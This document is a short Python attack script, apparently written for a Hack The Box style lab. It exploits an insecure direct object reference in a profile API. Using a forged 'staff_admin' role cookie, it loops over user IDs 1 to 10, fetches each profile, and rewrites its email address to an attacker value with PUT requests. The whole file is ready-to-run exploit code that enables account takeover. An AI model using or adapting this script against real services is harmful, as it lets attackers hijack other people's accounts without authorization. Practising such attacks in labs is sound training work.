#!/usr/bin/env python3

import requests
import json

BASE_URL = "http://TARGET_IP:PORT"
API_PATH = "/profile/api.php/profile" 
TARGET_KEY = "email"
NEW_VALUE = "hacked@pwned.htb"
HEADERS = {
    "Content-Type": "application/json",
    "Cookie": "role=staff_admin" # Update your session cookie!
}

ID_RANGE = range(1, 11)

def main():
    for i in ID_RANGE:
        target_url = f"{BASE_URL}{API_PATH}/{i}"
        print(f"[*] Processing ID {i}...")

        try:
            r_get = requests.get(target_url, headers=HEADERS)
            
            if r_get.status_code != 200:
                print(f" -> Failed to retrieve profile. Status: {r_get.status_code}")
                continue

            data = r_get.json()
            
            if TARGET_KEY in data:
                old_val = data[TARGET_KEY]
                print(f" -> Found {TARGET_KEY}: {old_val}")
                
                data[TARGET_KEY] = NEW_VALUE
                
                r_put = requests.put(target_url, json=data, headers=HEADERS)
                
                if r_put.status_code == 200:
                    print(f" -> [+] Success! Changed to: {NEW_VALUE}")
                else:
                    print(f" -> [!] Update failed. Status: {r_put.status_code}")
                    print(f" -> Response: {r_put.text}")
            else:
                print(f" -> Key '{TARGET_KEY}' not found in JSON response.")

        except json.JSONDecodeError:
            print(" -> [!] Error: Response was not valid JSON.")
        except Exception as e:
            print(f" -> [!] Connection Error: {e}")

if __name__ == "__main__":
    main()